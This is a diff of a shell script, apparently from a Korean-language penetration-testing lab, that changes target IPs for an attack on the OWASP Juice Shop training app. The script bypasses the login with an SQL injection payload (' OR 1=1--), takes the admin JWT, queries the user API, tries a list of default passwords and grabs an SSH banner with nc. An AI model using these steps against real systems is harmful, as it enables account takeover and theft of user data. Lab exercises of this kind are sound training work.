@@ -380,13 +380,13 @@ PYEOF
 echo "=== Juice Shop 로그인 + JWT 추출 ==="
 
 # SQL Injection으로 관리자 로그인
-RESPONSE=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+RESPONSE=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op","password":"admin123"}' 2>/dev/null)
 
 # 정상 비밀번호 실패 시 SQLi 시도
 if echo "$RESPONSE" | grep -q "Invalid"; then
-  RESPONSE=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  RESPONSE=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null)
 fi
@@ -539,7 +539,7 @@ echo "=== Juice Shop 크레덴셜 테스트 ==="
 PASSWORDS=("admin123" "password" "12345678" "admin" "test" "guest")
 
 for pwd in "${PASSWORDS[@]}"; do
-  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  RESULT=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pwd\"}" 2>/dev/null)
 
@@ -690,14 +690,14 @@ echo "============================================================"
 echo ""
 echo "[Phase 1] 인증 메커니즘 식별"
 echo "--- 웹 서버 인증 방식 ---"
-curl -sI http://10.20.30.80:3000/ 2>/dev/null | grep -iE "www-auth|set-cookie|authorization|x-auth"
+curl -sI http://10.20.40.81:3000/ 2>/dev/null | grep -iE "www-auth|set-cookie|authorization|x-auth"
 echo "--- API 인증 방식 ---"
 curl -s http://10.20.30.201:8000/projects 2>/dev/null | head -3
 
 echo ""
 echo "[Phase 2] JWT 토큰 공격"
 # SQLi로 로그인 → 토큰 획득 → 분석
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null | python3 -c "
 import sys,json
@@ -710,7 +710,7 @@ if [ -n "$TOKEN" ]; then
   echo "  JWT 획득 성공"
   # 토큰으로 관리자 API 접근
   curl -s -H "Authorization: Bearer $TOKEN" \
-    http://10.20.30.80:3000/api/Users/ 2>/dev/null | python3 -c "
+    http://10.20.40.81:3000/api/Users/ 2>/dev/null | python3 -c "
 import sys,json
 try:
     d=json.load(sys.stdin)
@@ -726,7 +726,7 @@ fi
 echo ""
 echo "[Phase 3] SSH 인증 공격"
 echo "--- SSH 배너 확인 ---"
-echo "" | nc -w2 10.20.30.80 22 2>/dev/null | head -1
+echo "" | nc -w2 10.20.32.80 22 2>/dev/null | head -1
 
 echo ""
 echo "[Phase 4] 결과 요약"
